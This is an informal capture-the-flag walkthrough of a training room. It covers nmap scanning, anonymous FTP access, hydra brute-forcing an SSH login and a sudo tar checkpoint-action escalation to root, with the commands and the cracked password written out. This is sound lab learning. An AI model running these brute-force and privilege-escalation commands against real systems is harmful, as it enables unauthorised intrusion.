
# Raw Notes
Started the server
did a basic nmap scan 
```bash
nmap -A 10.10.213.250 -T4
```

got 3 open ports:
- SSH
- FTP
- HTTP

ssh - we dont have creds yet 
lets go with FTP as Anonymous user as we got it in the nmap scan

boom we got logged into ftp
i was getting the passive mode thing so don't worry just write passive while in ftp and you will get what you need

got two file one with some tasks and a username - lin
second contained strings which were like passwords
we have ssh for it so it may contain password for the user "lin"

lets get hydra running
```bash
hydra -l lin -P locks.txt ssh://10.10.213.250 
```

we ran it and bingo got the password
```bash
[22][ssh] host: 10.10.213.250   login: lin   password: RedDr4gonSynd1cat3
```

using it to get ssh into system

bingo we are in the system and got the user.txt here

lets escalate our privilages now

lets see what lin can do 
```bash
User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```
lets search for anything that we can do with this over GTFO Bins

got something here as we can use sudo for tar we have a command to maintain shell and escalate privileges
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

boom we are root now and got access as a root and also the root flag
Done with the room